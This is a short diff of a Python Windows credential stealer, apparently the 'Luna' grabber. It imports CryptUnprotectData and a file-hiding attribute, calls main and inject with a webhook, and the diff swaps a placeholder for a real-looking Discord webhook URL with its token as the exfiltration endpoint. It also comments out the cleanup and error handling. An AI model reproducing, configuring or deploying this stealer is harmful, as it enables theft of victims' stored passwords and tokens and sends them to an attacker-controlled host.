@@ -25,7 +25,7 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-webhook = "%webhook_here%"
+webhook = "https://discord.com/api/webhooks/972339423842828409/yI7ALIleqW0qO_epOf9B_VKfcaidJNjB3oPznq0cMdmsDzM4y-lHBmogaAze7Hu156h5"
 ping = "%ping_enabled%"
 pingType = "%ping_type%"
 
@@ -75,7 +75,7 @@ def Luna():
     debug()
     main(webhook)
     inject(webhook)
-    cleanup()
+    # cleanup()
 
 def try_extract(func):
         def wrapper(*args, **kwargs):
@@ -617,11 +617,11 @@ class debug:
         exit()
 
 if __name__ == '__main__' and os.name == "nt":
-    try:
+    # try:
         debug()
         Luna()
-    except Exception:
-        try:
-            cleanup()
-        except Exception:
-            exit()
+    # except Exception:
+    #     try:
+    #         cleanup()
+    #     except Exception:
+    #         exit()
